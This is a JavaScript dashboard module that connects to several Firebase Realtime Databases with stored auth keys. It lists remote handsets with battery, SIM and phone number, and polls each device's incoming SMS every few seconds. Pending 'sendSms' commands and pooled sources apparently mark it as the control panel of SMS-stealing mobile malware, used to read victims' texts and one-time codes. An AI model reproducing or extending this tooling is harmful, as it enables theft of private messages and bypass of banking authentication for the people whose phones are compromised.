/**
 * FIREBASE MANAGER - Realtime Database
 * Reads devices from 'devices' and messages from 'messages/{deviceId}'
 */

// ────────────────────────────────────────────────
// STATE
// ────────────────────────────────────────────────

let firebaseInstances = {};
let allDevices = [];
let deviceListeners = {};
let isInitialized = false;
let firebaseConfigsCache = null;
let pollingIntervals = {};

// ────────────────────────────────────────────────
// CONFIG LOADING - FROM JSON FILE
// ────────────────────────────────────────────────

async function loadFirebaseConfigs() {
    console.log('📢 Loading Firebase configs from JSON file...');
    try {
        const response = await fetch('data/firebase-configs.json?' + Date.now());
        if (response.ok) {
            const data = await response.json();
            firebaseConfigsCache = data;
            localStorage.setItem('firebase_configs', JSON.stringify(data));
            console.log('✅ Firebase configs loaded:', data.sources ? data.sources.length : 0, 'sources');
            return data;
        }
    } catch (e) {
        console.log('⚠️ Error loading firebase-configs.json:', e.message);
    }
    
    try {
        const data = localStorage.getItem('firebase_configs');
        if (data) {
            const parsed = JSON.parse(data);
            if (parsed.sources && parsed.sources.length > 0) {
                firebaseConfigsCache = parsed;
                return parsed;
            }
        }
    } catch (e) {
        console.error('Error loading from localStorage:', e);
    }
    
    return { sources: [] };
}

// ────────────────────────────────────────────────
// INITIALIZATION
// ────────────────────────────────────────────────

async function initFirebaseConnections() {
    try {
        const configs = await loadFirebaseConfigs();
        console.log('📢 Firebase configs loaded:', configs);
        
        if (!configs || !configs.sources || configs.sources.length === 0) {
            console.log('📢 No Firebase sources configured');
            return false;
        }

        let successCount = 0;
        for (const source of configs.sources) {
            console.log(`📢 Connecting to Firebase: ${source.id}`);
            const connected = await connectToFirebase(source);
            if (connected) successCount++;
        }

        console.log(`📢 Connected to ${successCount}/${configs.sources.length} sources`);
        return successCount > 0;
    } catch (error) {
        console.error('❌ Error initializing Firebase:', error);
        return false;
    }
}

async function connectToFirebase(source) {
    try {
        const { id, url, key } = source;
        
        if (firebaseInstances[id] && firebaseInstances[id].connected) {
            return true;
        }

        console.log(`📢 Connecting to Firebase source: ${id}`);
        console.log(`📢 URL: ${url}`);

        // Test connection using devices.json
        const testUrl = `${url}/devices.json?auth=${key}&shallow=true`;
        const response = await fetch(testUrl);
        
        if (response.ok) {
            const data = await response.json();
            const count = data ? Object.keys(data).length : 0;
            console.log(`📢 Test query returned ${count} devices`);
            
            firebaseInstances[id] = {
                config: source,
                connected: true,
                url: url,
                key: key
            };
            return true;
        } else {
            console.error(`❌ Test failed: ${response.status}`);
            return false;
        }
    } catch (error) {
        console.error(`❌ Failed to connect:`, error);
        return false;
    }
}

function disconnectFromFirebase(sourceId) {
    try {
        if (pollingIntervals[sourceId]) {
            pollingIntervals[sourceId].forEach(interval => clearInterval(interval));
            delete pollingIntervals[sourceId];
        }
        if (firebaseInstances[sourceId]) {
            delete firebaseInstances[sourceId];
            console.log(`📢 Disconnected: ${sourceId}`);
        }
    } catch (error) {
        console.error(`❌ Error disconnecting:`, error);
    }
}

// ────────────────────────────────────────────────
// DEVICE MANAGEMENT - FROM devices.json
// ────────────────────────────────────────────────

async function fetchAllDevices() {
    allDevices = [];
    const sources = Object.keys(firebaseInstances);

    console.log(`📢 Fetching devices from ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) continue;

        try {
            const devices = await fetchDevicesFromSource(sourceId);
            allDevices = allDevices.concat(devices);
        } catch (error) {
            console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        }
    }

    console.log(`📢 Total devices found: ${allDevices.length}`);
    return allDevices;
}

function getDeviceStatus(deviceData) {
    // Check direct status field
    if (deviceData.status !== undefined) {
        const statusValue = deviceData.status;
        if (statusValue === false || 
            statusValue === 'false' || 
            statusValue === 'pending' || 
            statusValue === 'offline' ||
            statusValue === null) {
            return 'offline';
        }
        return 'online';
    }
    
    // Check command status
    const cmdData = deviceData.command || deviceData.commands || {};
    if (cmdData.status === 'pending') {
        return 'offline';
    }
    
    // Check webhookEvent status
    const webhookData = deviceData.webhookEvent?.sendSms || {};
    if (webhookData.status === 'pending') {
        return 'offline';
    }
    
    return 'online';
}

/**
 * Extract phone number from device data - Priority Order
 */
function extractPhoneNumber(deviceData) {
    // Try multiple locations in priority order
    const locations = [
        deviceData.command?.number,
        deviceData.webhookEvent?.sendSms?.number,
        deviceData.number,
        deviceData.phone,
        deviceData.command?.to,
        deviceData.webhookEvent?.sendSms?.to,
        deviceData.phoneNumber,
        deviceData.sms?.number
    ];
    
    for (const loc of locations) {
        if (loc && loc !== 'N/A' && loc !== '') {
            let phone = String(loc).replace(/\s+/g, '');
            // If number starts with 0, add +91
            if (phone.startsWith('0')) {
                phone = '+91' + phone.substring(1);
            }
            // If number is 10 digits and doesn't have +, add +91
            if (phone.match(/^\d{10}$/)) {
                phone = '+91' + phone;
            }
            return phone;
        }
    }
    return 'N/A';
}

async function fetchDevicesFromSource(sourceId) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        // Use devices.json instead of clients.json
        const apiUrl = `${url}/devices.json?auth=${key}`;
        console.log(`📢 Fetching from Realtime Database: devices.json`);
        
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const data = await response.json();
        const devices = [];

        if (!data) {
            console.log('⚠️ No devices found');
            return [];
        }

        const deviceIds = Object.keys(data);
        console.log(`📢 Found ${deviceIds.length} devices`);

        for (const deviceId of deviceIds) {
            const deviceData = data[deviceId];
            
            // ============================================
            // EXTRACT PHONE NUMBER
            // ============================================
            const phoneNumber = extractPhoneNumber(deviceData);
            
            // ============================================
            // EXTRACT BATTERY
            // ============================================
            let battery = 50;
            if (deviceData.battery) {
                const batStr = String(deviceData.battery);
                battery = parseInt(batStr.replace('%', ''));
                if (isNaN(battery)) battery = 50;
            }
            
            // ============================================
            // STATUS
            // ============================================
            const status = getDeviceStatus(deviceData);
            
            // ============================================
            // SMS BODY
            // ============================================
            const commandData = deviceData.command || deviceData.commands || deviceData.webhookEvent?.sendSms || {};
            const smsBody = commandData.body || commandData.message || commandData.text || '';
            
            // ============================================
            // BUILD DEVICE OBJECT
            // ============================================
            const device = {
                id: deviceId,
                sourceId: sourceId,
                name: deviceData.name || deviceId.substring(0, 8),
                number: phoneNumber,
                status: status,
                battery: battery,
                signal: '4G',
                model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
                lastSeen: deviceData.lastMessageTime ? timestampToISO(deviceData.lastMessageTime) : new Date().toISOString(),
                sims: phoneNumber !== 'N/A' ? [phoneNumber] : ['N/A'],
                unread: 0,
                raw: deviceData,
                smsBody: smsBody,
                smsSender: commandData.number || commandData.from || 'Unknown',
                smsTime: commandData.timestamp ? timestampToISO(commandData.timestamp) : new Date().toISOString()
            };
            
            devices.push(device);
            console.log(`✅ Device: ${device.id.substring(0, 8)}... → ${device.number} (${device.status})`);
        }

        return devices;
    } catch (error) {
        console.error(`❌ Error fetching devices:`, error);
        throw error;
    }
}

function listenToDevices(callback) {
    if (pollingIntervals.devices) {
        clearInterval(pollingIntervals.devices);
    }
    
    const intervalId = setInterval(async () => {
        try {
            await fetchAllDevices();
            if (callback) callback(allDevices);
        } catch (error) {
            console.error('❌ Error polling devices:', error);
        }
    }, 5000);

    pollingIntervals.devices = intervalId;
}

// ────────────────────────────────────────────────
// SMS MANAGEMENT - FROM messages/{deviceId}.json
// ────────────────────────────────────────────────

async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        // Use the exact endpoint you specified
        const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=${limit}`;
        console.log(`📢 Fetching messages for device: ${deviceId.substring(0, 8)}...`);
        
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            if (response.status === 404) {
                console.log(`📢 No messages found for device: ${deviceId.substring(0, 8)}...`);
            }
            return [];
        }
        
        const data = await response.json();
        
        if (!data) {
            return [];
        }
        
        const messages = Object.values(data);
        
        // Sort by timestamp descending (newest first)
        messages.sort((a, b) => {
            const aTime = a.id || a.timestamp || 0;
            const bTime = b.id || b.timestamp || 0;
            return bTime - aTime;
        });
        
        return messages.map(msg => {
            let timeStr = '';
            if (msg.dateTime) {
                timeStr = msg.dateTime;
            } else if (msg.timestamp) {
                timeStr = timestampToISO(msg.timestamp);
            } else if (msg.id) {
                timeStr = timestampToISO(msg.id);
            } else {
                timeStr = new Date().toISOString();
            }
            
            return {
                id: msg.id || msg.timestamp || Date.now(),
                sender: msg.sender || msg.from || 'Unknown',
                body: msg.message || msg.body || msg.text || '',
                time: timeStr,
                simNumber: msg.simNumber || 'N/A',
                type: msg.type || 'incoming',
                raw: msg
            };
        });
        
    } catch (error) {
        console.error(`❌ Error fetching SMS for device ${deviceId.substring(0, 8)}...:`, error);
        return [];
    }
}

function listenToSms(deviceId, sourceId, simNumber, callback) {
    const pollKey = `sms_${sourceId}_${deviceId}`;
    if (pollingIntervals[pollKey]) {
        clearInterval(pollingIntervals[pollKey]);
        delete pollingIntervals[pollKey];
    }

    console.log(`📢 Starting continuous SMS polling for device: ${deviceId.substring(0, 8)}...`);

    let lastMessageCount = 0;

    const intervalId = setInterval(async () => {
        try {
            const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
            
            if (messages.length > lastMessageCount) {
                console.log(`📢 New SMS detected for device: ${deviceId.substring(0, 8)}... (${messages.length} total)`);
            }
            
            lastMessageCount = messages.length;
            
            if (callback) callback(messages);
        } catch (error) {
            console.error('❌ Error polling SMS:', error);
        }
    }, 3000);

    pollingIntervals[pollKey] = intervalId;
    
    return () => {
        if (pollingIntervals[pollKey]) {
            clearInterval(pollingIntervals[pollKey]);
            delete pollingIntervals[pollKey];
        }
    };
}

// ────────────────────────────────────────────────
// EXPOSE TO GLOBAL SCOPE
// ────────────────────────────────────────────────

window.loadFirebaseConfigs = loadFirebaseConfigs;
window.initFirebaseConnections = initFirebaseConnections;
window.connectToFirebase = connectToFirebase;
window.disconnectFromFirebase = disconnectFromFirebase;
window.fetchAllDevices = fetchAllDevices;
window.fetchDevicesFromSource = fetchDevicesFromSource;
window.listenToDevices = listenToDevices;
window.fetchSmsForDevice = fetchSmsForDevice;
window.listenToSms = listenToSms;
window.firebaseInstances = firebaseInstances;
window.allDevices = allDevices;
window.pollingIntervals = pollingIntervals;
